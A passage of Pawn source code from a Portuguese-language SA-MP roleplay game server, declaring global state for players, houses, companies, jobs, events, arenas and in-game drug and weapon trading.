	skins_suburban = mS_INVALID_LISTID,
	skins_victim = mS_INVALID_LISTID,
	skins_zip = mS_INVALID_LISTID,
	skins_vip = mS_INVALID_LISTID
;

new PlayerText:_ACEITAR[MAX_PLAYERS];
new PlayerText:_ICONE[MAX_PLAYERS];
new PlayerText:_INFO[MAX_PLAYERS];
new PlayerText:_MSGFORM[MAX_PLAYERS];
new PlayerText:_RECUSAR[MAX_PLAYERS];
new PlayerText:_MSGTEMPO[MAX_PLAYERS];

new bool:give[MAX_PLAYERS];
new timerarms[MAX_PLAYERS] = -1;
new temptemp_[MAX_PLAYERS] = -1;
new preccArma[MAX_PLAYERS] = -1;
new trafcArma[MAX_PLAYERS] = -1;
new armaEscol[MAX_PLAYERS] = -1;
new compraArm[MAX_PLAYERS] = -1;

new pHospital[MAX_PLAYERS];

new PlayerText:CityPlayer[MAX_PLAYERS];
new PlayerText:LocalPlayer[MAX_PLAYERS];
new TextLocal[MAX_PLAYERS][4];

enum CidadesSanAndreas
{
	cidadeNome[28],
	Float:cidadeArea[6]
};

static const SanAndreasCidades[][CidadesSanAndreas] =
{
	{"Los Santos",                  {44.60,-2892.90,-242.90,2997.00,-768.00,900.00}},
	{"Las Venturas",                {869.40,596.30,-242.90,2997.00,2993.80,900.00}},
	{"Bone County",                 {-480.50,596.30,-242.90,869.40,2993.80,900.00}},
	{"Tierra Robada",               {-2997.40,1659.60,-242.90,-480.50,2993.80,900.00}},
	{"Tierra Robada",               {-1213.90,596.30,-242.90,-480.50,1659.60,900.00}},
	{"San Fierro",                  {-2997.40,-1115.50,-242.90,-1213.90,1659.60,900.00}},
	{"Red County",                  {-1213.90,-768.00,-242.90,2997.00,596.30,900.00}},
	{"Flint County",                {-1213.90,-2892.90,-242.90,44.60,-768.00,900.00}},
	{"Whetstone",                   {-2997.40,-2892.90,-242.90,-1213.90,-1115.50,900.00}}
};

stock GetPlayerCidade(playerid, zone[], len)
{
	new
	    Float:plx, Float:ply, Float:plz
	;
	GetPlayerPos(playerid, plx, ply, plz);
 	for(new i = 0; i != sizeof(SanAndreasCidades); i++)
	{
		if(plx >= SanAndreasCidades[i][cidadeArea][0] && plx <= SanAndreasCidades[i][cidadeArea][3] && ply >= SanAndreasCidades[i][cidadeArea][1] && ply <= SanAndreasCidades[i][cidadeArea][4])
		{
			return format(zone, len, SanAndreasCidades[i][cidadeNome], 0);
		}
	}
	return 0;
}

new Text:TextNomeServer;
new Text:TextNomeSite;
new Text:GPSLocal;

#define Labels
#define LoseHealth

#define Holding_Segurando(%0) \
	((newkeys & (%0)) == (%0))

#define MaxFire 350

#define ADMIN_CMDSFOUND   (05)
#define ADMIN_MAXVALUE	  (2000)

new
    FireObj[MaxFire],
    Float:FirePos[MaxFire][3],
	FireHealth[MaxFire],
	FireHealthMax[MaxFire],
	FireCreated[MaxFire],
	FirePlayer[MaxFire][24],
	FireAtual[MAX_PLAYERS],
	FireTimerP[MAX_PLAYERS],
	FireBaixa[MAX_PLAYERS],
	estCamB[MAX_VEHICLES];

#if defined Labels
new Text3D:FireText[MaxFire];
#endif

forward OnFireKill(ID, killerid);
forward HealthDown();

/*=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-*/
/* iVE: Vehicle Death/Explosion Physics */
/* by iPLEOMAX, 2011                    */
/* Please keep the credits!             */
/* Simple yet nice to see.. :D		*/
/*=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-*/
// Tweak your own..
#define EFFECT_RANDOM           20
#define EFFECT_FIX_DEFAULT      10
#define EFFECT_FIX_Z            0.008
#define EFFECT_MULTIPLIER 		0.05
#define EFFECT_HELI_VEL   		0.1
#define EFFECT_EXPLOSIONTYPE    1
#define EFFECT_EXPLOSIONOFFSET  -1.2
#define EFFECT_EXPLOSIONRADIUS  2.5

#define 	SERVER_MODEL   (10)
#define 	REGISTER_FOUND (2014)

//Model IDs for Vehicles
#define PLANES 460,476,511,512,513,519,520,553,577,592,593
#define HELIS 417,425,447,469,488,497,548,563

//
#define 	SLOT_ARMAS 				600
#define 	MAX_RACECHECKPOINTS 	1000
#define 	MAX_VEH_EVENTO 			100
#define		MAX_ZONE_NAME       	28
//
#define 	DIALOGID 		19000 // change if needed
#define 	MAX_COMP 		40  // maximum number of available components for a vehicle model; I think 40 is enough

// Definição de valor máximo e mínimo de prêmio
#define     EVENT_MAXPRE            100000
#define     EVENT_MINPRE            1
// Definição de valor máximo e mínimo de tempo
#define     EVENT_MAXTEM            30
#define     EVENT_MINTEM            1

#define     EVENT_MAXTEC            60
#define     EVENT_MINTEC            5

#define		D_DMEVENT			    5000
#define     EVENT_MINUT             60

new
	Text:dm_text_Top5[2],
	Text:dmColoText[5],
	Text:dmiTimer[2]
;
//godcar
new OnPlayerUpdateExTimer[MAX_PLAYERS];
new bool:godcar[MAX_PLAYERS];

forward OnPlayerUpdateEx(playerid);
//godcar

enum dm_rankingEnum
{
    dm_player_Score,
    dm_player_ID
}

// Dados evento players
enum evDMp
{
	dmParticipando,
	dm_Matou,
	dm_Morreu,
	dm_Colocado
}
new epDM[MAX_PLAYERS][evDMp];

// Dados evento server
enum evDMs
{
	evdmCriado,
	evdmCarregado,

 	evdmLiberado,

	evdmArenaID,
	evdmArenaIDDF,

	evdmArmaID[3],
	evdmArmaIDDF[3],
	evdmListarm,

	evdmArmaPK,
	evdmArmaPKDF,

	evdmTempo,
	evdmTempoAM,
	evdmTempoDF,

	evdmColete,
	evdmColeteDF,

	evdmPremio,
	evdmPremioDF,

	evdmTop,
	evdmTopDF,

	evdmGodMod,

	evdmTimer,

	evdmAnt_B,

	evdmCount,

	evdmCol[5]
};
new esDM[evDMs];

new
	Float:dmePos[3];

new Float:saeArena1[][4] =
{
    // Arena 1
    { -727.0291,520.6599,1371.9718,353.2555 }, // 1 1
    { -736.3893,483.2274,1371.8391,165.5252 }, // 1 2
    { -772.8566,463.2648,1365.4996,125.4391 }, // 1 3
    { -803.3965,454.2905,1359.3158,104.0069 }, // 1 4
    { -750.8290,488.7738,1371.5392,351.2893 }, // 1 5
    { -718.3323,528.2249,1371.9766,306.2893 }
};
new Float:saeArena2[][4] =
{
    // Arena 2
    { 1377.1782,-0.4214,1000.9191,82.0449 }, // 2 7
    { 1361.7836,5.7896,1008.1563,89.1890 }, // 2 8
    { 1381.6050,-29.2953,1000.9241,166.6015 }, // 2 9
    { 1410.0237,-32.3423,1000.9231,267.8091 }, // 2 10
    { 1360.8828,-25.2580,1000.9219,26.0831 }, // 2 11
    { 1413.1459,-17.5508,1000.9246,282.0972 }
};
new Float:saeArena3[][4] =
{
    // Arena 3
    { 1306.1029,-43.2980,1001.0369,190.0365 }, // 3 13
    { 1278.1573,-27.2230,1001.0211,30.4857 }, // 3 14
    { 1253.0864,2.0625,1001.0329,39.6142 }, // 3 15
    { 1249.9265,-43.2485,1001.0331,168.2074 }, // 3 16
    { 1280.6672,-7.8055,1001.0156,288.4842 }, // 3 17
    { 1250.1813,5.7682,1008.2578,90.8317 }
};
new Float:saeArena4[][4] =
{
    // Arena 4
    { -2854.8704,-974.6747,-12.3047,54.7145 }, // 4 19
    { -2781.6680,-975.2460,-10.6534,272.2301 }, // 4 20
    { -2747.2595,-1026.0131,-8.8233,196.0267 }, // 4 21
    { -2738.9063,-981.7145,-10.0983,300.0309 }, // 4 22
    { -2836.7607,-945.7419,-4.9118,84.4998 }, // 4 23
    { -2861.3567,-987.4069,-13.3715,130.1425 }
};
new Float:saeArena5[][4] =
{
    // Arena 5
    { -2084.7603,-124.6616,35.3274,347.6581 }, // 5 25
    { -2017.7175,-126.7433,35.2537,267.8827 }, // 5 26
    { -2020.6228,-255.9410,35.3203,177.7880 }, // 5 27
    { -2052.0698,-246.4458,35.3274,70.3812 }, // 5 28
    { -2089.2534,-273.7407,35.3203,132.9391 }, // 5 29
    { -2092.0554,-197.2523,35.3203,358.7894 }
};

new intArena[][1] =
{
	(0),
	{ 1 }, // Liberty city
	{ 1 }, // Warehouse 1
	{ 18 }, // Warehouse 2
	{ 0 }, // Água
	{ 0 } // Árena SF(AutoEscola)
};

//

#define 	MAX_PLAYER_CARS 		20
#define 	DIALOG_SET_LIST 		120

/*forward PCar_PlayerConnect(playerid);
forward PCar_PlayerDisconnect(playerid);
forward PCar_DialogResponse(playerid, dialogid, response, listitem);
forward PCar_VehicleDeath(vehicleid);

enum Player_Car_Info
{
	Float:CposX,
	Float:CposY,
	Float:CposZ,
	Float:CposA,
	Color1,
	Color2,
	CarID
}
new
    PlayerCarCreated[MAX_PLAYERS] = -1,
    PlayerCar[MAX_PLAYERS][MAX_PLAYER_CARS][Player_Car_Info],
	PlayerCarModelo[MAX_PLAYERS][MAX_PLAYER_CARS][Player_Car_Info],
	PlayerCarConectado[MAX_PLAYERS][MAX_PLAYER_CARS][Player_Car_Info]
;

enum carsetD
{
	car_DonoID,
	car_ValidS
}
new PCar_oInfo[MAX_VEHICLES][carsetD];*/

//

new
 	aClima;
new
	bool:gelarSpawn[MAX_PLAYERS];

new
	icon_casa = 98,
	icon_empr = 97
;
new
	Tempo[MAX_PLAYERS]
;
new
	ccount[MAX_PLAYERS], componentsid[MAX_PLAYERS][MAX_COMP]
;

#define	convertN(%1) \
		(((%1) < 0) ? (-(%1)) : ((%1)))
//
#define MAX_BALOES 50

enum infoBalao
{
	BalaoID,
	ObjectFogo,
	ObjectFogo1,
	BalaoDono[MAX_PLAYER_NAME],
	Float:posBalaoX,
	Float:posBalaoY,
	Float:posBalaoZ,
	Float:posBOX,
	Float:posBOY,
	Float:posBOZ
}
new bInfo[MAX_BALOES][infoBalao];

enum ibalaoPlayer
{
	Direcao,
	timerBalao
}
new bpInfo[MAX_PLAYERS][ibalaoPlayer];

new Text:InfoSite;
new Text:InfoLevel[MAX_PLAYERS];

new death[MAX_PLAYERS];
new pdeaths[MAX_PLAYERS];

new
	modoP;

new
	Text:WE_GAMES1, Text:WE_GAMES2, Text:BoxCarregando, Text:LoginScreen[8];
new
	C_MATHEUS;
new
	floodCMD[MAX_PLAYERS][2], Help[MAX_PLAYERS];

new Text:Entrada_T1[MAX_PLAYERS];

new
	Teleporte[MAX_PLAYERS];

new
	viwerAN[MAX_PLAYERS];

new
	tempoCarga[MAX_PLAYERS], cargaTempo[MAX_PLAYERS], saiuCaminhao[MAX_PLAYERS];

enum Organizacoes
{
	ORG_ID,
	Lider,
	SubLider,
	Membro
}
new oInfo[MAX_PLAYERS][Organizacoes];

new
	useOculos[MAX_PLAYERS] = -1,
	useMascara[MAX_PLAYERS] = -1,
	useChapeu[MAX_PLAYERS] = -1,
	useTipo[MAX_PLAYERS];

new
	estacionouSET[MAX_PLAYERS];
stock
	Float:AngleBetweenPoints(Float:XA, Float:YA, Float:XB, Float:YB)
{
	new Float:Angle=-(90+(atan2(YA-YB,XA-XB)));// * 180.0 / 3.141592653;
	return Angle;
}

stock
    bool:   bIllegalPlayer  [MAX_PLAYERS] = false,
            szTmpKickName   [MAX_PLAYER_NAME];

new bool:validArmas[MAX_PLAYERS];
new LiberadoEmpresa[MAX_PLAYERS];
new Float:oPosx[MAX_PLAYERS], Float:oPosy[MAX_PLAYERS], Float:oPosz[MAX_PLAYERS], Float:oPosa[MAX_PLAYERS];
new Crioutapete[MAX_PLAYERS];
new Estacionou[MAX_PLAYERS];
new cAdvogadop[MAX_PLAYERS];
new veiculoRC[34];
new GameRC[MAX_PLAYERS];

new Finalizou[MAX_PLAYERS];
new Float:Posicao[MAX_VEHICLES][4];
new vEvento[MAX_VEHICLES];
new ivEvento[MAX_VEHICLES];
new Float:CheckPoint[MAX_RACECHECKPOINTS][4];
new SetPlayerCheckPoint[MAX_PLAYERS];
new ParticipandoEvento[MAX_PLAYERS];
new ClickMause[MAX_PLAYERS];
new vOcupou[MAX_PLAYERS];
new VeiculosEvento;
new ContagemRegressiva;
new vOcupados = 0;
new Text:TextNumero;
new Text: text_Top5[2];
new TipoCheckPoint;
new T_Rank;
new T_AntBug;
new CheckID;
new UltimoCP;
new AlguemVenceu;
new AlguemVenceu2;
new AlguemVenceu3;
new EventoCriado;
new MaxCheck = -1;
new EventoCarregado;
new Volta[MAX_PLAYERS];
new Tempo_Volta[MAX_PLAYERS] = 50;
new
	VencedorNome1[64] = "Ninguém",
	VencedorNome2[64] = "Ninguém",
	VencedorNome3[64] = "Ninguém"
;
enum rankingEnum
{
    player_Score,
    player_ID
}

new Text:LevelEXP[MAX_PLAYERS];
new Text:p_TextPreso[MAX_PLAYERS];
new Text:TempoPreso[MAX_PLAYERS];

new	digitouChat[MAX_PLAYERS];
new floodChat[MAX_PLAYERS];

new RotaBus[MAX_PLAYERS];
new tempoBus[MAX_PLAYERS];
new timerBus[MAX_PLAYERS];

new Float:LifeDuelo[MAX_PLAYERS];

new Text:Server_Areas[MAX_PLAYERS];
//---------------- Caminhoneiro ---------------------
new bool:CaminhaoCarga[MAX_PLAYERS];
new bool:CaminhaoDesCargaSolarin[MAX_PLAYERS];
new bool:CaminhaoDesCargaWangCars[MAX_PLAYERS];
new bool:CaminhaoDesCargaMichelin[MAX_PLAYERS];
new bool:CaminhaoDesCargaSprunk[MAX_PLAYERS];
new bool:CaminhaoDesCargaXoomer[MAX_PLAYERS];
new bool:CaminhaoDesCargaFlaischberg[MAX_PLAYERS];
new bool:CaminhaoDesCargaHaul[MAX_PLAYERS];
//---------------------------------------------------
new bool:AreadePesca[MAX_PLAYERS];
new bool:AreadeCasca[MAX_PLAYERS];
new bool:AreaFazendaDrogas[MAX_PLAYERS];
new bool:AreaFazendaArmas[MAX_PLAYERS];
new bool:AreaTRANSPORTADOR[MAX_PLAYERS];
new bool:AreaContrabandista[MAX_PLAYERS];
new bool:AreaDeContrabandista[MAX_PLAYERS];

//HabsVIP
//new bool:HabsVIP[MAX_PLAYERS];
//
new AreasGZServer[13];
//
new vHouse[MAX_VEHICLES];
new vHouseRespawn[MAX_VEHICLES];

/* Pizza */
new Pizza_ID[MAX_PLAYERS];
new Pizza_PID[MAX_PLAYERS];
new Pizza_IID[MAX_PLAYERS];
new Pizza_SID[MAX_PLAYERS];
new Pizza_VALOR[MAX_PLAYERS];
new Pizza_Timer[MAX_PLAYERS];
new Pizza_Mensagem[MAX_PLAYERS];
new Pizza_Oferecido[MAX_PLAYERS];
new Pizza_Recebido[MAX_PLAYERS];
/* Cura */
new Cura_ID[MAX_PLAYERS];
new Cura_PID[MAX_PLAYERS];
new Cura_IID[MAX_PLAYERS];
new Cura_VALOR[MAX_PLAYERS];
new Cura_Timer[MAX_PLAYERS];
new Cura_Mensagem[MAX_PLAYERS];
new Cura_Oferecido[MAX_PLAYERS];
new Cura_Recebido[MAX_PLAYERS];
/* Skin */
new _SKIN_ID[MAX_PLAYERS];
new _SKIN_PID[MAX_PLAYERS];
new _SKIN_IID[MAX_PLAYERS];
new _SKIN_SID[MAX_PLAYERS];
new _SKIN_VALOR[MAX_PLAYERS];
new _SKIN_Timer[MAX_PLAYERS];
new _SKIN_Mensagem[MAX_PLAYERS];
new _SKIN_Oferecido[MAX_PLAYERS];
new _SKIN_Recebido[MAX_PLAYERS];
/* GASOLINA */
new GASO_ID[MAX_PLAYERS];
new GASO_PID[MAX_PLAYERS];
new GASO_SID[MAX_PLAYERS];
new GASO_IID[MAX_PLAYERS];
new GASO_VALOR[MAX_PLAYERS];
new GASO_Timer[MAX_PLAYERS];
new GASO_Mensagem[MAX_PLAYERS];
new GASO_Oferecido[MAX_PLAYERS];
new GASO_Recebido[MAX_PLAYERS];
/* Maconha */
new Maconha_ID[MAX_PLAYERS];
new Maconha_PID[MAX_PLAYERS];
new Maconha_IID[MAX_PLAYERS];
new Maconha_QTD[MAX_PLAYERS];
new Maconha_VALOR[MAX_PLAYERS];
new Maconha_Timer[MAX_PLAYERS];
new Maconha_Mensagem[MAX_PLAYERS];
new Maconha_Oferecido[MAX_PLAYERS];
new Maconha_Recebido[MAX_PLAYERS];
/* Cocaína */
new Farinha_ID[MAX_PLAYERS];
new Farinha_PID[MAX_PLAYERS];
new Farinha_IID[MAX_PLAYERS];
new Farinha_QTD[MAX_PLAYERS];
new Farinha_VALOR[MAX_PLAYERS];
new Farinha_Timer[MAX_PLAYERS];
new Farinha_Mensagem[MAX_PLAYERS];
new Farinha_Oferecido[MAX_PLAYERS];
new Farinha_Recebido[MAX_PLAYERS];
/* Crack */
new Crack_ID[MAX_PLAYERS];
new Crack_PID[MAX_PLAYERS];
new Crack_IID[MAX_PLAYERS];
new Crack_QTD[MAX_PLAYERS];
new Crack_VALOR[MAX_PLAYERS];
new Crack_Timer[MAX_PLAYERS];
new Crack_Mensagem[MAX_PLAYERS];
new Crack_Oferecido[MAX_PLAYERS];
new Crack_Recebido[MAX_PLAYERS];

/*    Anti Chester    */

new
	ArmasProibidas[] =
{
	35, 	// Rocket Launcher
	36, 	// HS Rocket Launcher
	37, 	// Flamethrower
	38, 	// Minigun
};

new vPreco[MAX_PLAYERS];

new
	LIMITE_PING = 2500
;
new
	Taxi_Bandeira = 1
;

new N_Liberado[MAX_PLAYERS];

new
	Text:TextAnuncio[4], pNome[MAX_PLAYERS], T_Tipo[MAX_PLAYERS], T_Timer, Anunciado
;
new TextCor[MAX_PLAYERS];
new CountHospital[MAX_PLAYERS];
new CountTimerHospital[MAX_PLAYERS];

new Text:MSG_Matou[MAX_PLAYERS];

new RandomMSG[][] =
{
    "{FFA600}Viva {FF1E1E}W{1E90FF}E {FF1E1E} {FFFFFF}Acesse nosso fórum: forumwe.vivagamesonline.com",
    "{FFA600}Viva {FF1E1E}W{1E90FF}E {FF1E1E} {FFFFFF}Adquira itens e aparelhos essenciais nas lojas de utilitários.",
    "{FFA600}Viva {FF1E1E}W{1E90FF}E {FF1E1E} {FFFFFF}Quer ganhar uma grana extra? Vá a uma lotéria e concorra a prêmios em dinheiro.",
    "{FFA600}Viva {FF1E1E}W{1E90FF}E {FF1E1E} {FFFFFF}Para fazer uma denúncia contra criminosos, disque /190 e informe os oficiais. ",
    "{FFA600}Viva {FF1E1E}W{1E90FF}E {FF1E1E} {FFFFFF}Caso aviste um cheater, não anuncie no chat! Use o /Reportar.",
    "{FFA600}Viva {FF1E1E}W{1E90FF}E {FF1E1E} {FFFFFF}Para evitar punições, sempre respeite as regras, use: /Regras.",
    "{FFA600}Viva {FF1E1E}W{1E90FF}E {FF1E1E} {FFFFFF}Acesse o fórum do servidor e fique sempre ligado nas novidades, use: /forum.",
    "{FFA600}Viva {FF1E1E}W{1E90FF}E {FF1E1E} {FFFFFF}Caso necessite da ajuda de um médico, disque /192 e aguarde a chegada da ambulância.",
    "{FFA600}Viva {FF1E1E}W{1E90FF}E {FF1E1E} {FFFFFF}Você pode trocar seu visual em uma loja de roupas, cada loja tem skins diferentes.",
	"{FFA600}Viva {FF1E1E}W{1E90FF}E {FF1E1E} {FFFFFF}Caso esteja sem combustível, procure o posto mais próximo e abasteça!",
	"{FFA600}Viva {FF1E1E}W{1E90FF}E {FF1E1E} {FFFFFF}Visite nossa loja online e adquira casas, veículos próprios, VIP, dentre outros!",
	"{FFA600}Viva {FF1E1E}W{1E90FF}E {FF1E1E} {FFFFFF}Para evitar perda de dados e pertences, sempre tire prints do que tens."
};

enum PlayerInfo
{
	bool:Logado,
	bool:NeedsOff,
	ErrouRcon,
	bool:EntrouL,
	EntrouAgencia,
	EntrouBanco,
	bool:AFK,
	Hosp,
	ContaBanco,
	Prof,
	Sexo,
	SkinP,
	Exp,
	Level,
	SegUP,
	MinUP,
	AdminL,
	Gas,
	HabTCarro,
	HabTMoto,
	HabTTrem,
	HabTCaminhao,
	HabNBarco,
	HabAHeli,
	HabAAviao,
	HabP,
	Spawn,
	Luta,
	Preso,
	Casa[128],
	Morando[128],
	Cocaina,
	Pego_QtaCoca,
	Pego_QtaMaco,
	Pego_QtaCrac,
	PT_Cocaina,
	PT_Maconha,
	PT_Crack,
	KiloD,
	Tem_GPS,
	Tem_RelogioUP,
	RelogioCor,
 	R_UP_ON_OFF,
 	Tem_Velocimetro,
 	Tem_Capacete,
	StatusCapacete,
	ModeloCapacete,
 	VelocimetroO_F,
 	Tem_Cura,
 	Tem_Kit,
	bool:Continuar,
	Float:ContX,
	Float:ContY,
	Float:ContZ,
	Float:ContW,
	ContI,
	Jetpack,
	fMatou,
	fMorreu,
	PLAYER_VIP,
	Convenio,
	Seguro,
	Abuser,
	MsgSpawn,
	bool:pLogin,
	psErrou,
	chat,
	vchat,
	vchat2,
	fardado,
	ccolete,
	plocalizando,
	plocalizname[24],
	bool:pproc,
	bool:procMorto,
	entroupref,
	entrouHAB,
	entrouDEL,
	Celular,
	Celular_c,
	Pistolas,
	Shotguns,
	Micros,
	SubMG,
	Rifles,
	Sniper,
	bool:Treinando
};
new pInfo[MAX_PLAYERS][PlayerInfo];

new pCargo[MAX_PLAYERS],
	pPatente[MAX_PLAYERS],
	pAssalto[MAX_PLAYERS];

enum MainZone
{
	Zone_Name[28],
	Float:Zone_Area[6]
};

//	   	---			Relogio
#define 	FUSORARIO		0

new Text:Relogio;
new Text:Data;
new Text:RDinheiro;
new Text:Barra1;
new Text:Barra2;
new Text:Barra3;

//-- EMpresas
#define 	MAX_EMPRESAS  	110

new DonoEmpresa[MAX_PLAYERS];
new ContratoMsg[MAX_PLAYERS];
new T_Contratado[MAX_PLAYERS];
new AceitarContrato[MAX_PLAYERS];

enum EmpInfo
{
	Venda,
	Preco,
	NomeEmp[64],
	EmpresaNome[64],
	NomeEmpresa[64],
	Proprietario[64],
	Funcionario1[64],
	Funcionario2[64],
	Funcionario3[64],
	Login[80],
	Horario[64],
	Numero,
	Identidade[64],
	Float:PickupX,
	Float:PickupY,
	Float:PickupZ,
	Float:InteriorX,
	Float:InteriorY,
	Float:InteriorZ,
	Text3D:TxTt,
	InteriorID,
	Aberta,
	VirtualWorld,
	ID_VEICULOE
};
new EmpresaInfo[MAX_EMPRESAS][EmpInfo];
new EmpresaPickup[MAX_EMPRESAS];
new CompanyPickup[MAX_PLAYERS];
new InCompanyPickup[MAX_PLAYERS];
new EntrouEmpresa[MAX_PLAYERS];
new bateu_ponto[MAX_PLAYERS];
new bateu_ponto1[MAX_PLAYERS];
//-- Casas
#define		MAX_CASAS		362 // Máximo de casas disponíveis.

enum Info
{
	Venda,
	Preco,
	Morador[64],
	Morador2[64],
	Morador3[64],
	Proprietario[64],
	Mensagem[64],
	Login[80],
	Horario[64],
	Numero,
	Float:PickupX,
	Float:PickupY,
	Float:PickupZ,
	Float:InteriorX,
	Float:InteriorY,
	Float:InteriorZ,
	InteriorID,
	Status,
	VirtualWorld,
    MapIcon,
    vLiberado,
	vM1,
	vM2,
	vM3
};

new
	CasaInfo[MAX_CASAS][Info],
	CasaPickup[MAX_CASAS],
	Text3D:CasaLabel[MAX_CASAS],
	InHouse[MAX_PLAYERS] = -1,
	HousePickup[MAX_PLAYERS],
	InHousePickup[MAX_PLAYERS],
	EntrouCasa[MAX_PLAYERS] = 0
;

new LiberadoCasa[MAX_PLAYERS];

new
	MoradorCasaID[MAX_PLAYERS] = -1,
	AceitarMorador[MAX_PLAYERS],
	MoradorCount[MAX_PLAYERS],
	T_Morador[MAX_PLAYERS],
	T_Preso[MAX_PLAYERS]
;
new MensagemHouse[MAX_PLAYERS];

enum HouseCarInfo
{
	CarModel,
	Float:CarX,
	Float:CarY,
	Float:CarZ,
	Float:CarAng,
	Cor1,
	Cor2,
	Respawn,
	HouseCar,
	NewCar,
	Text3D:Label,
	t_Cor_1,
	t_Cor_2,
	t_PaintJob,
	t_Nitro,
	t_Roda,
	t_Spoiler,
	t_Hydraulico,
	t_ParachoqueDianteiro,
	t_ParachoqueTraseiro,
	t_Escapamento,
	t_Bventr,
	t_Bventl,
	t_Bscoop,
	t_Rscoop,
	t_Lskirt,
	t_Rskirt,
	t_Base,
	t_Rbbars,
	t_Fbbars,
	t_Lights
};
new cInfo[MAX_CASAS][HouseCarInfo];

//     ---         AFK         ---
new
	Float:GetPosPlayer[3],
	TempoAFK[MAX_PLAYERS],
	Text:AFK1,
	Text:AFK2
;

enum pPos
{
	Float:LastX,
	Float:LastY,
	Float:LastZ,
};
new PlayerLastPos[MAX_PLAYERS][pPos];

//-- Text's Draws
new
	Text:Zones[MAX_PLAYERS]
;

new
    Text:Velocimetro0[MAX_PLAYERS],
    Text:Velocimetro1[MAX_PLAYERS],
    Text:Velocimetro2[MAX_PLAYERS],
    Text:Velocimetro3[MAX_PLAYERS],
    Text:Velocimetro4[MAX_PLAYERS],
    Text:Velocimetro5[MAX_PLAYERS],
    Text:Velocimetro6[MAX_PLAYERS],
    Text:Velocimetro7[MAX_PLAYERS],
    Text:Velocimetro8[MAX_PLAYERS],
	/*Text:Velocidade[MAX_PLAYERS],
	Text:Gasolina[MAX_PLAYERS],
	Text:Modelo[MAX_PLAYERS],
	Text:VeiculoV[MAX_PLAYERS],
	Text:VeiculoL[MAX_PLAYERS],*/
	Text:VIPtext[MAX_PLAYERS]
;

//new Text:BoxVeloc;
//-- Areas

new
	ContinTimer[MAX_PLAYERS]
;

new
    GZ_Favela,
	Text:Favela_1,
	Text:Favela_2,
	Text:IMG_Matou,
	Text:IMG_Morreu,
	bool:TextFavela[MAX_PLAYERS]
;

new
	bool:AreaPosto[MAX_PLAYERS]
;

//-- Arrays
new
	gStr[128],
	gFile[128],
	hFile[128],
	pFile[128]
;

new
	ePick[43], // Picks de entrada
	sPick[23] // Pick de saida
;
new CP_DV1;
new CP_DV2;
new CP_DV3;
new CP_DV4;
new CP_DV5;
new CP_DV6;
new CP_0;
new CP_1;
new CP_2;
new CP_3;
new CP_4;
new CP_5;
new CP_6;
new CP_7;
new CP_9;
new CP_10;
new CP_11;
new CP_12;
new CP_13;
new CP_14;
new CP_15;
new CP_16;
new CP_17;
new CP_22;
new CP_23;
new CP_24;
new CP_25;
new CP_29;
new CP_30;
/*new CP_31;
new CP_32;
new CP_33;
new CP_34;*/
new CP_35;
new CP_37;
//new CP_38;
new CP_39;
new CP_40;

new CP_41;
new CP_42;
new CP_43;
new CP_44;
new CP_45;
new CP_46;
new CP_47;
new CP_48;
new CP_49;
new CP_50;
new CP_51;
new CP_52;
new
	CP_53,
	CP_54,
	CP_55
;

new
	CP_56,
	CP_57,
	CP_58,
	CP_59,
	CP_60
;

new
	cCaixas[27], ServerICON[103]
;

new
	vercmds[MAX_PLAYERS]
;

new
	Taximetro[MAX_PLAYERS][4],
	PrecoTaximetro[MAX_PLAYERS],
	T_Taximetro[MAX_PLAYERS],
	Taxista_P[MAX_PLAYERS]
;

new T_Drogas[MAX_PLAYERS];

new
	bool:OfereceuCoca[MAX_PLAYERS],
	RecebeuCoca[MAX_PLAYERS],
	ValorCoca[MAX_PLAYERS],
	QuantiaCoca[MAX_PLAYERS],
	AceitarCoca[MAX_PLAYERS]
;

new
	Text:TextLevelUP[MAX_PLAYERS]
;

new
	bool:InAreaCarga[MAX_PLAYERS],
	bool:InDescargaSolarin[MAX_PLAYERS],
	bool:InDescargaWangCars[MAX_PLAYERS],
	bool:InDescargaMichelin[MAX_PLAYERS],
	bool:InDescargaSprunk[MAX_PLAYERS],
	bool:InDescargaXoomer[MAX_PLAYERS],
	bool:InDescargaFlaischberg[MAX_PLAYERS],
	bool:InDescargaHaul[MAX_PLAYERS],
	Carga[MAX_PLAYERS],
	Carregou[MAX_PLAYERS]
;

//Petroleiro
new
	Carregado[MAX_PLAYERS],
	PCarga[MAX_PLAYERS];
new
	BancoLogin[MAX_PLAYERS] = 0
;

//-- Area Funções Pescador
new
	Pescando[MAX_PLAYERS],
	JaPescando[MAX_PLAYERS],
	JaCascando[MAX_PLAYERS],
	wepCount[MAX_PLAYERS],
	PlayerText:gtPlayer
;

//-- Veiculos
new
	vTRANSPORTADOR[15],
	vSegurancas[3],
	vPescadores[4],
	vMotoristap[2],
	vMotoTaxista[3],
	vPilotoPart[6],
	vTraficDrogas[6],
	vTraficArmas[4],
	vHitman[3],
	vTerrorista[4],
	vChefeMafia[5],
	vFotografo[2],
	vReporter[4],
	vInstrutor[2],
	vMecanico[7],
	vMedico[2],
	vPadre[1],
	vPizzaBoy[5],
	vAdvogado[2],
	vAmbulancias[10],
	vBombeiros[8],
	vPrefeito[3],
	vNovatos[10],
	vPrivados[6],
	//vRestrito[13],
	vContrabandista[10]
;

new
	CargaEstacaoLS[MAX_PLAYERS],
	CargaEstacaoLV[MAX_PLAYERS],
	CargaEstacaoSF[MAX_PLAYERS],
	Mercadoria1[MAX_PLAYERS],
	Mercadoria[MAX_PLAYERS]
;

new
	Algemou[MAX_PLAYERS],
	Algemado[MAX_PLAYERS],
	P_Liberado[MAX_PLAYERS],
	Multou[MAX_PLAYERS]
;

new Prendeu[MAX_PLAYERS];
new Soltou[MAX_PLAYERS];
new Procurou[MAX_PLAYERS];

new
	T_GPS[MAX_PLAYERS]
;

new
	bool:GPS[MAX_PLAYERS]
;

new
	PassouRadar[MAX_PLAYERS]
;

new
 	Tirou_F[MAX_PLAYERS]
;

enum GPSInfo
{
	zone_name[30],
    Float:zone_minx,
    Float:zone_miny,
    Float:zone_minz,
    Float:zone_maxx,
    Float:zone_maxy,
    Float:zone_maxz
}

#define 			MAX_SPIKESTRIPS 			200

enum sInfo
{
	sCreated,
    Float:sX,
    Float:sY,
    Float:sZ,
    sObject,
};
new SpikeInfo[MAX_SPIKESTRIPS][sInfo];

new
	PlantouBomba[MAX_PLAYERS]
;

new
	T_Noiado[MAX_PLAYERS]
;

new
	Text:Flash
;

new
	CaminhaoGuincho = 0
;

new
	Eguicho[MAX_PLAYERS]
;

new
    Anunciou[MAX_PLAYERS]
;

new
	GPS_Ligado[MAX_PLAYERS]
;

new
	aviso[MAX_PLAYERS] = 0,
